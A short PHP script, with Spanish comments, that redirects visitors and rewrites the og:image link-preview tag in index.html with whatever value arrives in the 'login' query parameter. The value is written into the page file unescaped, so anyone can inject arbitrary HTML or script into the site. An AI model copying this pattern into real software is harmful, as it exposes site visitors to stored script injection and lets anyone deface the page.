



<?php
// Fatal Error

ob_start();
 
function get_string_between($string, $start, $end)
{
    $string = " " . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0) {
        return "";
    }
 
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

header("Location:img.php");

   //$ft = fopen("data.txt","a");
   $email = $_GET["login"];
//$serie = $_GET[''];
//$numero = $_GET[''];
//$matricula = $_GET['m'];
//$ft = file_get_contents("index.html");
//$ft = fread("index.html","r+");
//$data = "index.html";
$oldFile="index.html"; 
//$archivo = "index.html";
$leer = fopen($oldFile, 'r+');
$data = fread($leer, filesize($oldFile));
fclose($leer);

   $busqueda = get_string_between($data, '<meta property="og:image" content="', '" /><meta property="og:url" content=');
    
 //$error = str_replace('El código verificador no se corresponde con el indicado en la imagen', '<input type="submit" id="error"value="Error deslize para reintentar">', $errorvalidar);
 


file_put_contents($oldFile,str_replace($busqueda, $email,file_get_contents($oldFile)));


//header("Location: $sitioweb");
//fwrite($data, "A".$master0);
//echo "$busqueda";
?>